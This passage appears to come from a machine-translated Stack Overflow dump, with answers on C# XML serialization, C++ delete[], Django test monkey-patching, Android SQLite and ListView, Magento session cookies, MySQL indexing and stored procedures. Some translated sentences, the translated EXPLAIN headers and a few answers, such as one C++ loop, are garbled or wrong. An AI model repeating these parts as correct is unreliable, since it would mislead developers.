        XmlWriter xmlWriter = XmlWriter.Create(writer, settings);

        XmlSerializerNamespaces names = new XmlSerializerNamespaces();
        names.Add("", "");

        XmlSerializer serializer = new XmlSerializer(typeof(T));

        serializer.Serialize(xmlWriter, obj, names);
        var xml = writer.ToString();
        return xml;
    }

    public static void Serialize<T>(T obj, string filepath)
    {
        XmlWriterSettings settings = new XmlWriterSettings();
        settings.OmitXmlDeclaration = true;
        var writer = new StreamWriter(filepath);
        XmlWriter xmlWriter = XmlWriter.Create(writer, settings);

        XmlSerializerNamespaces names = new XmlSerializerNamespaces();
        names.Add("", "");

        XmlSerializer serializer = new XmlSerializer(typeof(T));

        serializer.Serialize(xmlWriter, obj, names);
    } 
```

实际上我意识到代码会重复自己。在这些方法中，只改变一个东西就是 writer 对象，所以代码必须像下面这样。这样，您只需更改编写器对象类型即可轻松使用代码。

```
 public static string Serialize<T>(T obj)
    {
        var writer = new StringWriter();
        Serialize<T>(obj,writer);
        var xml = writer.ToString();
        return xml;
    }

    public static void Serialize<T>(T obj, string filepath)
    {
        var writer = new StreamWriter(filepath);
        Serialize<T>(obj,writer);
    }

    public static void Serialize<T>(T obj, TextWriter writer)
    {
        XmlWriterSettings settings = new XmlWriterSettings();
        settings.OmitXmlDeclaration = true;
        XmlWriter xmlWriter = XmlWriter.Create(writer, settings);            
        XmlSerializerNamespaces names = new XmlSerializerNamespaces();
        names.Add("", "");            
        XmlSerializer serializer = new XmlSerializer(typeof(T));            
        serializer.Serialize(xmlWriter, obj, names);
    } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-09-28T02:25:10.080

与@payo 的原始答案非常相似：

如果您想删除命名空间，您可能还想删除版本，为了节省您的搜索，我添加了该功能，因此下面的代码将同时执行这两项操作。

我还将它包装在一个通用方法中，因为我正在创建非常大的 xml 文件，这些文件太大而无法在内存中序列化，因此我将输出文件分解并将其序列化为更小的“块”：

```
public string XmlSerialize<T>(T entity) where T : class
{
    // removes version
    XmlWriterSettings settings = new XmlWriterSettings();
    settings.OmitXmlDeclaration = true;

    XmlSerializer xsSubmit = new XmlSerializer(typeof(T));
    StringWriter sw = new StringWriter();
    using (XmlWriter writer = XmlWriter.Create(sw, settings))
    {
        // removes namespace
        var xmlns = new XmlSerializerNamespaces();
        xmlns.Add(string.Empty, string.Empty);

        xsSubmit.Serialize(writer, entity, xmlns);
        return sw.ToString(); // Your XML
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-04-18T21:24:43.013

如果您使用 XmlWriter，则有一个设置可以省略声明 [http://msdn.microsoft.com/en-us/library/system.xml.xmlwritersettings.omitxmldeclaration.aspx](http://msdn.microsoft.com/en-us/library/system.xml.xmlwritersettings.omitxmldeclaration.aspx)

我会举一个例子，但这可能足以让你继续前进。

* * *

编辑：这是在 LinqPad 中运行的示例

```
string test  = "test";
XmlWriterSettings settings = new XmlWriterSettings();
settings.OmitXmlDeclaration = true;
MemoryStream strm = new MemoryStream();
XmlWriter writer = XmlWriter.Create(strm, settings);
XmlSerializer serializer =  new XmlSerializer(typeof(string));
serializer.Serialize(writer, test);
strm.Position = 0;
StreamReader reader = new StreamReader(strm);
var x = reader.ReadToEnd();
x.Dump();
writer.Close();
reader.Close();
strm.Close(); 
```

输出

`<string>test</string>`

注释掉第 3 行，输出为

`<?xml version="1.0" encoding="utf-8"?><string>test</string>`

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-05-19T12:54:37.937

只是为了简化解决方案。这里删除UTF编码声明的原始问题是代码

```
 StringBuilder sb = new StringBuilder();
                var serializer = new System.Xml.Serialization.XmlSerializer(typeToSerialize.GetType());
                serializer.Serialize(System.Xml.XmlWriter.Create(sb, new System.Xml.XmlWriterSettings { OmitXmlDeclaration = true, Indent=true }), typeToSerialize); 
```

# c++ - 删除类数组

> ID：10218182
> 
> 赞同：0
> 
> 时间：2012-04-18T21:19:39.370
> 
> 标签：c++

以下是否会正确销毁所有内容（调用所有适当的析构函数并释放所有内存）？

```
Class* var[50];
var[0] = new SubClass();

delete[] *var; 
```

如同

```
Class** var = new Class*[50];
var[0] = new SubClass();

delete[] var; 
```

或者我应该遍历数组并删除每个单独的对象（这是我认为 delete[] 所做的）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:30:44.850

正确的方法是使用像`std::vector<std::unique_ptr<MyClass>>`. 这将始终保证正确的资源清理，无需用户干预。任何看到或使用的 C++ 代码都`delete`应该`new[]`立即`delete[]`重构以避免它们——并且`new`应该再看一遍。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:21:46.693

```
Class* var[50];
var[0] = new SubClass();

delete[] *var; 
```

This is undefined behavior. The proper way is

```
delete var[0]; //equivalent to delete *var; 
```

If you allocate memory for all 50 elements of the array, then you have to iterate and delete each one of them. Think of it this way:

*   for every `new`, you should have an associated `delete`
*   for every `new[]`, you should have an associate `delete[]`
*   don't mix up `new` with `delete[]` and `new[]` with `delete` as it leads to undefined behavior

Your second snippet is illegal C++.

**EDIT** As you're clearly a beginner, let's break this down a bit. Since the second snippet doesn't even compile, I'm going to focus on the first one:

```
Class* var[50]; 
```

This declares an array of 50 pointers to `Class`. The pointers are dangling - they are not initialized and `Class` objects aren't created.

```
var[0] = new SubClass(); 
```

This allocates memory for a `SubClass` object and assigns the first pointer in the array. All other pointers remain uninitialized.

```
*var; 
```

returns the first element, which is a `Class*`. It's equivalent to `var[0]`.

```
delete[] *var; 
```

attempts to call `delete[]` on a `Class*`, which was allocated with `new`, so it results in undefined behavior.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:28:13.293

`delete[]`用于动态分配的数组。它对应于`new []`。

摘自 C++ 开放标准 (3.7.4.2)

> 如果释放函数因抛出异常而终止，则行为未定义。提供给释放函数的第一个参数的值可以是空指针值；如果是这样，并且如果释放函数是标准库中提供的函数，则调用无效。否则，标准库中**提供给 operator delete(void*)**的值应是先前调用 operator **new(std::size_t)** 或 operator new(std::size_t, const std::时返回的值之一nothrow_t&) 在标准库中，**提供给标准库中 operator delete[](void*)**的值应是先前调用任一 operator **new[](std::size_t)返回的值之一**或标准库中的 operator new[](std::size_t, const std::nothrow_t&) 。

你的第一个例子不使用`new []`所以你不应该使用`delete []`!!!

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-18T21:21:33.923

```
for(int i = 0; i < 50;i++)delete var[i];
delete[] var; 
```

# django - Unit testing in Django

> ID：10218186
> 
> 赞同：0
> 
> 时间：2012-04-18T21:20:18.190
> 
> 标签：django, unit-testing, django-testing

Let's suppose I do some change to a function in the `tests.py` file, like monkey patching the `clean` method of some form...

**When all the tests are finished, will that method still have associated the function I assigned?**

A concrete example (to avoid captcha validation when testing):

```
from myapp.fields import ReCaptchaField
ReCaptchaField.clean = lambda x, y: y[0] 
```

The same applies to adding/changing some field in the `settings.py` file...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:38:31.993

是的，它将保持关联。这就是猴子修补的好处/副作用/危险，在进程生命周期内更改默认行为。

# android - Android sqlite查询字符串在哪里

> ID：10218187
> 
> 赞同：0
> 
> 时间：2012-04-18T21:20:26.773
> 
> 标签：android, sqlite

为什么我收到此代码错误？

```
public Cursor getAllTitlesFromInnerListGroup(String tablename, String grp) {
    String[] columns = new String[]{KEY_ROWID_T, KEY_NAME_T, KEY_PRIORITY_T, KEY_FINISHED_T, KEY_NOTES_T, KEY_HIDDEN_T, KEY_QUANTITY_T, KEY_GROUP_T};
    //return ourDatabase.query("GL_" + tablename, columns, KEY_GROUP_T + "='Volvo'", null, null, null, null); //this works
    return ourDatabase.query("GL_" + tablename, columns, KEY_GROUP_T + "=" + grp, null, null, null, null);
} 
```

> 04-18 21:10:53.118: E/AndroidRuntime(30721): 引起: android.database.sqlite.SQLiteException: 没有这样的列: Volvo: 编译时: SELECT _id, grlist_name, grlist_priority, grlist_finished, grlist_notes, grlist_hidden, grlist_quantity, grlist_group FROM GL_table WHERE grlist_group=Volvo

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T21:26:29.170

改变这个：

```
return ourDatabase.query("GL_" + tablename, columns, KEY_GROUP_T + "=" + grp,
null, null, null, null); 
```

对此：

```
return ourDatabase.query("GL_" + tablename, columns, KEY_GROUP_T + "= ?" ,
new String[]{grp}, null, null, null); 
```

# magento - Double Set-Cookie in Magento, leading to a login issue for some users

> ID：10218191
> 
> 赞同：7
> 
> 时间：2012-04-18T21:20:36.087
> 
> 标签：magento, cookies, login

We have a Magento application which is issuing dual Set-Cookie's . Here are the headers:

```
 HTTP/1.1 200 OK
  Date: Wed, 18 Apr 2012 21:04:28 GMT
  Server: Apache/2.2.3 (CentOS)
  X-Powered-By: PHP/5.2.10
  Set-Cookie: frontend=iti6c00cdm6cc79hfl1pl9pq52; expires=Wed, 18-Apr-2012 22:04:28 GMT; path=/
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
  Pragma: no-cache
  Set-Cookie: frontend=iti6c00cdm6cc79hfl1pl9pq52; expires=Wed, 18-Apr-2012 22:04:28 GMT; path=/; domain=**example.com**
  Connection: close
  Transfer-Encoding: chunked
  Content-Type: text/html; charset=UTF-8 
```

In some circumstances, after logging in the second cookie is set to frontend=deleted . From my reading it appears that two frontend= cookies are not a "problem", this is standard Magento behaviour. From my reading of the spec, the second frontend= cookie will overwrite the first if their scope/spec is the same.

Any ideas where we can start digging in to this problem to see why the second frontend= cookie does not behave like the first?

Magento version is enterprise edition of ver. 1.9.0.0

Related Questions

*   [Why does Magento use 2 cookies per session?](https://stackoverflow.com/questions/3924093/why-does-magento-use-2-cookies-per-session)
*   [Magento Cookies Changing Prevent Frontend Login](https://stackoverflow.com/questions/8948638/magento-cookies-changing-prevent-frontend-login)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-12-12T13:58:22.677

当会话验证检查失败时会发生这种情况 - 然后将使用“已删除”值和过去的到期日期清除 cookie：

Magento 将检查以下信息以验证会话：

*   连接到服务器的客户端 IP 地址
*   “通过”HTTP 标头
*   “X-Forwarded-For”标头
*   “用户代理”标头

如果这些信息中的一个（或多个）在对同一会话 ID 的请求期间发生更改，则会话将被丢弃，Cookie 将以所述方式清除，服务器将向主页发送重定向标头。

您可以通过转到系统 > 配置 > Web 来更改要在 Magento 管理面板中验证的信息。但是您**永远不**应该关闭所有检查，因为这将允许会话劫持。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-25T13:03:04.343

你想覆盖fronten cookie吗...如果是这样最好尝试首先销毁cookie然后使用Magento方法重置它

Mage::getModel('core/cookie')->set('frontend', $session->getCustomer()->getId(), 100000*24*3600);

# android - Android listview项目更改背景颜色

> ID：10218192
> 
> 赞同：0
> 
> 时间：2012-04-18T21:20:38.373
> 
> 标签：android, android-listview

我无法更改我的列表视图项目的背景颜色。

```
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.info_layout);
    ListView listView;
    listView = (ListView) findViewById(R.id.infolistView);
    final String[] values = new String[] { "TO1", "TO2", "TO3" };
    ArrayAdapter<String> adapter =
        new ArrayAdapter<String>(this,
                                 android.R.layout.simple_list_item_1,
                                 android.R.id.text1,
                                 values);
    listView.setAdapter(adapter);

    // This is not make anything , why ?
    View vi=adapter.getView(0, null, null);
    vi.setBackgroundColor(Color.YELLOW);

listView.setOnItemClickListener(new OnItemClickListener() {
        public void onItemClick(AdapterView<?> parent, View view,
                        int position, long id) {
                //But here is running good
                view.setBackgroundColor(Color.RED);}
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:26:46.283

您正在做的方式只是获取一个填充了位置数据的视图实例，然后在调用该方法后该实例死亡并被垃圾收集。

要更改列表中的实际视图，您必须从适配器更改颜色并编写自定义适配器，或者让颜色以该状态开始。

基本上`getView`不会从视图列表中获取，而只是创建一个新视图，除非您将其传递给视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T05:15:36.720

您必须创建自定义适配器来更改项目的背景颜色。

这是自定义适配器的示例：

```
public class PaListAdapter  extends BaseAdapter{
        private LayoutInflater mInflater;

         private ArrayList<String> platevalue = new ArrayList<String>();

           ViewHolder holder;
        public PaListAdapter(Context context,ArrayList<String> value)
        {
            // Cache the LayoutInflate to avoid asking for a new one each time.
            mInflater = LayoutInflater.from(context);

            //mycontext = context;
            platevalue.clear();
            platevalue =value;

        }

        public int getCount() 
        {
            return platevalue.size();
        }

        public Object getItem(int position) 
        {
            return position;
        }

        public long getItemId(int position) 
        {
            return position;
        }

        public View getView(int position, View convertView, ViewGroup parent) 
        {

            if (convertView == null) 
            {
                 convertView = mInflater.inflate(R.layout.select_dialog, null);

                holder = new ViewHolder();
                holder.hTransID =(TextView) convertView.findViewById(R.id.txtChoice);

                holder.ch   =(CheckBox) convertView.findViewById(R.id.chk);

                convertView.setTag(holder);
            }
            else 
            {
                holder = (ViewHolder) convertView.getTag();
            }

            holder.hTransID.setText(platevalue.get(position));

            return convertView;
        }

        static class ViewHolder 
        {      
              TextView    hTransID;

        }
    }

select_dialog.xml

<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="horizontal"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:descendantFocusability="blocksDescendants"
 android:background="#000000"
    >

    <TextView
        android:id="@+id/txtChoice"

        android:layout_gravity="center_vertical|left"
        android:gravity="center_vertical|left"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" 
        android:textColor="#000000"/> 

</LinearLayout> 
```

在 Activity Class.Define 它像：

```
 simpleefficientadapter efficientadapter;

   efficientadapter=new simpleefficientadapter(CLASSNAME.this, VALUES);
   listView.setAdapter(efficientadapter); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-04T13:43:58.563

您可以创建 listView 项目的实例并使用`getChildAt()`接受整数的方法。然后设置视图实例背景颜色 -

```
View focusedChild = listView.getChildAt(r);
focusedChild.setBackgroundColor(Color.RED); 
```

# mysql - 按日期顺序排序时，“使用临时”会减慢查询速度

> ID：10218194
> 
> 赞同：5
> 
> 时间：2012-04-18T21:20:54.207
> 
> 标签：mysql, indexing, query-optimization

我有一个日志条目表，以及大约 100 个可能的日志代码的描述表：

```
CREATE TABLE `log_entries` (
  `logentry_id` int(11) NOT NULL AUTO_INCREMENT,
  `date` datetime NOT NULL,
  `partner_id` smallint(4) NOT NULL,
  `log_code` smallint(4) NOT NULL,
  PRIMARY KEY (`logentry_id`),
  KEY `IX_code` (`log_code`),
  KEY `IX_partner_code` (`partner_id`,`log_code`)
) ENGINE=MyISAM ;

CREATE TABLE IF NOT EXISTS `log_codes` (
  `log_code` smallint(4) NOT NULL DEFAULT '0',
  `log_desc` varchar(255) DEFAULT NULL,
  `category_overview` tinyint(1) NOT NULL DEFAULT '0',
  `category_error` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`log_code`),
  KEY `IX_overview_code` (`category_overview`,`log_code`),
  KEY `IX_error_code` (`category_error`,`log_code`)
) ENGINE=MyISAM ; 
```

以下查询（匹配 20k 行中的 10k）在 0.0034 秒内执行（使用`LIMIT 0,20`）：

```
SELECT log_entries.date, log_codes.log_desc FROM log_entries 
INNER JOIN log_codes ON log_codes.log_code = log_entries.log_code 
WHERE log_entries.partner_id = 1 AND log_codes.category_overview = 1; 
```

但是当添加 时`ORDER BY log_entries.logentry_id DESC`，这当然是必要的，它会减慢到 0.6 秒。可能是因为在 log_codes 表上使用了“使用临时”？删除索引实际上使查询执行得更快，但仍然很慢（0.3 秒）。

EXPLAIN 不带 ORDER BY 的查询输出：

```
+----+-------------+-------------+------+--------- --------------------+------------------+----------+- --------------+------+-------------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+------+--------- --------------------+------------------+----------+- --------------+------+-------------+
| 1 | 简单 | 日志代码 | 参考 | PRIMARY,IX_overview_code | IX_overview_code | 1 | 常量 | 56 | |
| 1 | 简单 | 日志条目 | 参考 | IX_code,IX_partner_code | IX_partner_code | 7 | 常量，log_codes.log_code | 25 | 使用位置 |
+----+-------------+-------------+------+--------- --------------------+------------------+----------+- --------------+------+-------------+

```

并包括 ORDER BY：

```
+----+-------------+-------------+------+--------- --------------------+------------------+----------+- ----------------------+------+------ ----------------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+------+--------- --------------------+------------------+----------+- ----------------------+------+------ ----------------+
| 1 | 简单 | 日志代码 | 参考 | PRIMARY,IX_overview_code | IX_overview_code | 1 | 常量 | 56 | 使用临时的；使用文件排序 |
| 1 | 简单 | 日志条目 | 参考 | IX_code,IX_partner_code | IX_partner_code | 7 | 常量，log_codes.log_code | 25 | 使用位置 |
+----+-------------+-------------+------+--------- --------------------+------------------+----------+- ----------------------+------+------ ----------------+

```

关于如何让这个查询执行得更快的任何提示？我不明白为什么需要“使用临时”，因为在获取和排序适当的日志条目之前应该选择日志代码？

**更新@Eugen Rieck**：

```
SELECT log_entries.date, lc.log_desc FROM log_entries INNER JOIN (SELECT log_desc, log_code FROM log_codes WHERE category_overview = 1) AS lc ON lc.log_code = log_entries.log_code WHERE log_entries.partner_id = 1 ORDER BY log_entries.logentry_id;
+----+-------------+-------------+------+--------- --+------------------+----------+---- ---------------+------+--------------- ------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+------+--------- --+------------------+----------+---- ---------------+------+--------------- ------+
| 1 | 初级 | <派生2> | 全部 | 空 | 空 | 空 | 空 | 57 | 使用临时的；使用文件排序 |
| 1 | 初级 | 日志条目 | 参考 | IX_code,IX_partner_code | IX_partner_code | 7 | 常量，lc.log_code | 25 | 使用位置 |
| 2 | 派生 | 日志代码 | 参考 | IX_overview_code | IX_overview_code | 1 | | 56 | |
+----+-------------+-------------+------+--------- --+------------------+----------+---- ---------------+------+--------------- ------+

```

**更新@RolandoMySQLDBA**：

*使用我的原始索引，ORDER BY date DESC：*

```
SELECT log_entries.date, log_codes.log_desc FROM (SELECT log_code,date FROM log_entries WHERE partner_id = 1) log_entries INNER JOIN (SELECT log_code,log_desc FROM log_codes WHERE category_overview = 1) log_codes USING (log_code) ORDER BY log_entries.date DESC;
+----+-------------+-------------+------+--------- ------+------+---------+------+---- ---+------------------------------------------------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+------+--------- ------+------+---------+------+---- ---+------------------------------------------------+
| 1 | 初级 | <派生3> | 全部 | 空 | 空 | 空 | 空 | 57 | 使用临时的；使用文件排序 |
| 1 | 初级 | <派生2> | 全部 | 空 | 空 | 空 | 空 | 21937 | 使用哪里；使用连接缓冲区 |
| 3 | 派生 | 日志代码 | 参考 | IX_overview_code | IX_overview_code | 1 | | 56 | |
| 2 | 派生 | 日志条目 | 全部 | IX_partner_code | 空 | 空 | 空 | 22787 | 使用位置 |
+----+-------------+-------------+------+--------- ------+------+---------+------+---- ---+------------------------------------------------+

```

*使用您的索引，无需排序：*

```
SELECT log_entries.date, log_codes.log_desc FROM (SELECT log_code,date FROM log_entries WHERE partner_id = 1) log_entries INNER JOIN (SELECT log_code,log_desc FROM log_codes WHERE category_overview = 1) log_codes USING (log_code);
+----+-------------+-------------+--------+-------- ---------------+-----------+---------+ ------+--------+--------------------------------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+--------+-------- ---------------+-----------+---------+ ------+--------+--------------------------------+
| 1 | 初级 | <派生3> | 全部 | 空 | 空 | 空 | 空 | 57 | |
| 1 | 初级 | <派生2> | 全部 | 空 | 空 | 空 | 空 | 21937 | 使用哪里；使用连接缓冲区 |
| 3 | 派生 | 日志代码 | 索引 | IX_overview_code_desc | IX_overview_code_desc | 771 | 空 | 80 | 使用哪里；使用索引 |
| 2 | 派生 | 日志条目 | 索引 | IX_partner_code_date | IX_partner_code_date | 15 | 空 | 22787 | 使用哪里；使用索引 |
+----+-------------+-------------+--------+-------- ---------------+-----------+---------+ ------+--------+--------------------------------+

```

*使用您的索引，按日期 DESC 排序：*

```
SELECT log_entries.date, log_codes.log_desc FROM (SELECT log_code,date FROM log_entries WHERE partner_id = 1) log_entries INNER JOIN (SELECT log_code,log_desc FROM log_codes WHERE category_overview = 1) log_codes USING (log_code) ORDER BY log_entries.date DESC;
+----+-------------+-------------+--------+-------- ---------------+-----------+---------+ ------+--------+----------------------------------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+--------+-------- ---------------+-----------+---------+ ------+--------+----------------------------------+
| 1 | 初级 | <派生3> | 全部 | 空 | 空 | 空 | 空 | 57 | 使用临时的；使用文件排序 |
| 1 | 初级 | <派生2> | 全部 | 空 | 空 | 空 | 空 | 21937 | 使用哪里；使用连接缓冲区 |
| 3 | 派生 | 日志代码 | 索引 | IX_overview_code_desc | IX_overview_code_desc | 771 | 空 | 80 | 使用哪里；使用索引 |
| 2 | 派生 | 日志条目 | 索引 | IX_partner_code_date | IX_partner_code_date | 15 | 空 | 22787 | 使用哪里；使用索引 |
+----+-------------+-------------+--------+-------- ---------------+-----------+---------+ ------+--------+----------------------------------+

```

**更新@Joe Stefanelli**：

```
SELECT log_entries.date, log_codes.log_desc FROM log_entries INNER JOIN log_codes ON log_codes.log_code = log_entries.log_code WHERE log_entries.partner_id = 1 AND log_codes.category_overview = 1 ORDER BY date DESC;
+----+-------------+-------------+------+--------- -----------------+-----------------+---------+---- ----------------------+------+-------- --------------------------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+-------------+------+--------- -----------------+-----------------+---------+---- ----------------------+------+-------- --------------------------+
| 1 | 简单 | 日志代码 | 全部 | PRIMARY,IX_code_overview | 空 | 空 | 空 | 80 | 使用哪里；使用临时的；使用文件排序 |
| 1 | 简单 | 日志条目 | 参考 | IX_code,IX_code_partner | IX_code_partner | 7 | log_codes.log_code,const | 25 | 使用位置 |
+----+-------------+-------------+------+--------- -----------------+-----------------+---------+---- ----------------------+------+-------- --------------------------+

```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T19:35:41.983

我认为，这里和类似问题中的大多数问题都来自对 MySQL（和其他数据库）如何使用索引进行排序的误解。答案是：MySQL 不使用索引进行排序，它只是可以按照索引的顺序或相反的方向读取数据。如果您碰巧希望按照当前使用的索引的顺序对数据进行排序 - 您很幸运，否则结果将被排序（因此 EXPLAIN 中的文件排序）

也就是说，整个结果的顺序主要取决于连接中的第一个表。如果您查看您的 EXPLAIN，您会看到连接从“log_codes”表开始（因为它要小得多）。

基本上，您需要的是'log_entries'上的复合索引（partner_id，date），'log_codes'的覆盖复合索引（log_code，category_overview，log_desc），将'INNER JOIN'更改为'STRAIGHT_JOIN'以强制加入顺序，并按“日期”DESC 排序（幸运的是，该索引也会覆盖）。

**UPD1**：对不起，我输错了第一个表的索引：应该是`(partner_id, log_code, date)`.

> 但是当我尝试对另一个表中的列进行排序时，我仍然很难理解为什么 MySQL 选择在 log_codes 表上“使用临时”（以及 100 倍的查询时间）？

MySQL可以直接输出数据，只要你同意它获取它的顺序，或者将数据放在一个临时表中，然后应用排序和输出。当您从连接中的任何非第一个表中按字段排序时，MySQL 必须对数据进行排序（不仅仅是按索引的顺序输出）并且对数据进行排序需要一个临时表。

> 但随着我深入数据集，它会变慢（LIMIT 50000,25 为 6 秒）。你知道为什么吗？

要输出 50000,25 行，MySQL 无论如何都需要获取前 50000 行并跳过它们。由于我错过了索引中的一列，MySQL 不仅对索引进行了扫描，而且为每个项目在磁盘上进行了额外的`log_code`值查找。使用覆盖索引应该更快，因为可以从索引中获取所有数据。

**UPD2**：尝试强制索引：

```
SELECT log_entries.date, log_codes.log_desc
FROM log_entries FORCE INDEX (IX_partner_code_date)
STRAIGHT_JOIN log_codes
  ON log_codes.log_code = log_entries.log_code
WHERE log_entries.partner_id = 1
  AND log_codes.category_overview = 1
ORDER BY log_entries.date DESC; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:37:18.423

你将需要两件事

## 重构查询

```
SELECT log_entries.date, log_codes.log_desc FROM 
(SELECT log_code,date FROM log_entries WHERE partner_id = 1) log_entries
INNER JOIN
(SELECT log_code,log_desc FROM log_codes WHERE category_overview = 1) log_codes
USING (log_code); 
```

## 创建索引以支持子查询并减少表访问

在创建这些索引之前，运行这些

```
SELECT COUNT(1) rowcount,partner_id FROM log_entries GROUP BY partner_id;
SELECT COUNT(1) rowcount,category_overview FROM log_codes GROUP BY category_overview; 
```

如果所有可能的 partner_id 值中没有一个计数超过 log_entries 表的 5%，则创建此索引

```
ALTER TABLE log_entries ADD INDEX (partner_id,log_code,date); 
```

如果所有可能的 category_overview 值中没有一个计数超过 log_codes 表的 5%，则创建此索引

```
ALTER TABLE log_codes ADD INDEX (category_overview,log_code,log_desc); 
```

试试看 ！！！

请尝试使用`LIMIT 0,25`包含的重构查询

```
SELECT log_entries.date, log_codes.log_desc FROM 
(
    SELECT A.log_code FROM 
    (SELECT log_code FROM log_entries WHERE partner_id = 1) A INNER JOIN
    (SELECT log_code FROM log_codes WHERE category_overview = 1) B USING (log_code)
    LIMIT 0,25
) log_code_keys
INNER JOIN log_entries USING (log_code)
INNER JOIN log_code USING (log_code); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:25:03.357

我将从反转`IX_partner_code`和`IX_overview_code`索引中的列开始。这应该使它们更适合同时支持 JOIN 和 WHERE 子句。

```
...
KEY `IX_code_partner` (`log_code`,`partner_id`)
...
KEY `IX_code_overview` (`log_code`,`category_overview`),
... 
```

# ios - UIWebView 不渲染 html 元素的位置：相对或绝对，直到滚动停止

> ID：10218197
> 
> 赞同：1
> 
> 时间：2012-04-18T21:21:13.560
> 
> 标签：ios

我有一个带有图像列表的 UIWebView

```
<ul>
<li> <img src="foo"></li> 
<li> <img src="foo"></li> 
<li> <img src="foo"></li> 
</ul> 
```

最初当我没有设置样式时它似乎工作正常，但现在我已经将图像包装在一个 div 中并添加了一些 css 样式以使位置：相对或绝对它不会在滚动期间呈现。，

```
<ul>
<li>
  <div class="stylish"><img src="foo"></div>
</li> 
<li>
  <div class="stylish"><img src="foo"></div>
</li>
<li>
  <div class="stylish"><img src="foo"></div>
</li> 
</ul> 
```

在滚动完全停止之前什么都没有显示。然后它立即闪入视野。
因此，看起来如果我有任何具有绝对或相对位置的 html 元素，在滚动完全停止之前它不会呈现。奇怪的是，从 css 中删除位置属性允许元素在滚动时呈现。使用像 iScroll 这样的 javascript 库也解决了这个问题，但 iScroll 比 iOS 上的原生动量滚动更加生涩。

我能做些什么让它在滚动时渲染或显示，甚至可以让它在减速时开始渲染或其他什么，而不是等待它完全停止？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T12:23:38.260

根据实验，UIWebView 不会在滚动过程中呈现任何不具有“静态”css 位置属性的内容。相对和绝对都会导致元素在滚动完全停止之前不渲染。

# c# - 数据库查询中的存储过程与代码

> ID：10218204
> 
> 赞同：4
> 
> 时间：2012-04-18T21:21:32.493
> 
> 标签：c#, asp.net, sql, stored-procedures

使用 ASP.NET 代码访问数据库与使用 SQL 存储过程进行查询之间的性能差异是什么

为了便于使用，对查询进行编码更容易，尤其是在进行维护和更改时。

但是，存储过程在数据库中编译并由数据库运行。

哪一种更高效，更好用？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:34:58.533

SQL Server 缓存任何查询的执行计划，无论是否 SPROC。这里几乎没有区别。基本上，在使用存储过程时，您无需通过网络发送查询文本，仅此而已。来源：http: [//msdn.microsoft.com/en-us/library/ms181055.aspx](http://msdn.microsoft.com/en-us/library/ms181055.aspx)

在没有特殊原因的情况下，做任何对你来说更方便的事情。

其他表明存储过程通常具有更好性能的答案是不正确的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:28:08.523

只要它是一个以数据库为中心的查询，那么存储过程在大多数情况下将是更快的选择（性能）。

但它更难维护，因为它不在您的常规源包中。

“更好用”取决于要求。如果当查询稍微慢一点（比如 1 毫秒 VS 3 毫秒）时它还可以，那么将您的代码放在一起并将其放在 ASP 中。如果性能是您想要将其放入数据库中的东西。

我将大部分查询放入代码中，并且仅将那些需要数据库性能的查询放入其中。

当然，这也取决于使用的数据库系统。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:43:50.077

关于您实际比较的内容，您的问题非常不完整。

SQL 代码是在存储过程中还是在从客户端提交的完整的内联 SQL 语句中通常对性能影响不大（假设参数化正确且 SQL 是非病态的）。它可以在安全体系结构和需要授予基表或视图的访问权而不是过程的执行权方面产生很大的不同。存储过程鼓励将参数化作为一项要求，但也可以使用内联 SQL 进行参数化。

如果您谈论的是针对从数据库返回的集合执行逻辑而不是在数据库中执行工作，这可以是双向的——这取决于操作的类型、索引的类型、客户端和数据库之间的带宽以及请求的数量需要维修。

通常，我会首先在数据库中进行操作，以保持连接/循环逻辑从客户端抽象出来并减少网络上的数据（列和行）并向客户端提供一个简单的数据集 API，但它取决于.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-02-06T16:10:23.307

这是一个“取决于”的问题。
